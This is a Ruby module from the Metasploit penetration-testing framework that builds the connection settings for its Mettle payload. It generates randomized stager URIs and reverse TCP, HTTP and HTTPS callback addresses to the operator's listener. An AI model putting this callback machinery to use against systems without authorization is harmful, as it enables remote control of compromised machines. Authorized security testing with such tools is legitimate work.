# -*- coding: binary -*-

require 'msf/core/payload/transport_config'
require 'msf/core/payload/uuid/options'
require 'base64'

module Msf
  module Sessions
    module MettleConfig

      include Msf::Payload::TransportConfig

      def generate_uri(opts={})
        ds = opts[:datastore] || datastore
        uri_req_len = ds['StagerURILength'].to_i

        # Choose a random URI length between 30 and 128 bytes
        if uri_req_len == 0
          uri_req_len = 30 + luri.length + rand(127 - (30 + luri.length))
        end

        if uri_req_len < 5
          raise ArgumentError, "Minimum StagerURILength is 5"
        end

        generate_uri_uuid_mode(:init_connect, uri_req_len, uuid: opts[:uuid])
      end

      def generate_http_uri(opts)
        if Rex::Socket.is_ipv6?(opts[:lhost])
          target_uri = "#{opts[:scheme]}://[#{opts[:lhost]}]"
        else
          target_uri = "#{opts[:scheme]}://#{opts[:lhost]}"
        end

        target_uri << ':'
        target_uri << opts[:lport].to_s
        target_uri << luri
        target_uri << generate_uri(opts)
        target_uri
      end

      def generate_tcp_uri(opts)
        if Rex::Socket.is_ipv6?(opts[:lhost])
          target_uri = "#{opts[:scheme]}://[#{opts[:lhost]}]"
        else
          target_uri = "#{opts[:scheme]}://#{opts[:lhost]}"
        end
        target_uri << ':'
        target_uri << opts[:lport].to_s
        target_uri
      end

      def generate_config(opts={})
        opts[:uuid] ||= generate_payload_uuid
        case opts[:scheme]
        when 'http'
          transport = transport_config_reverse_http(opts)
          opts[:uri] = generate_http_uri(transport)
        when 'https'
          transport = transport_config_reverse_https(opts)
          opts[:uri] = generate_http_uri(transport)
        when 'tcp'
          transport = transport_config_reverse_tcp(opts)
          opts[:uri] = generate_tcp_uri(transport)
        else
          raise ArgumentError, "Unknown scheme: #{opts[:scheme]}"
        end
        opts[:uuid] = Base64.encode64(opts[:uuid].to_raw).strip
        opts.slice(:uuid, :uri, :debug, :log_file)
      end

    end
  end
end
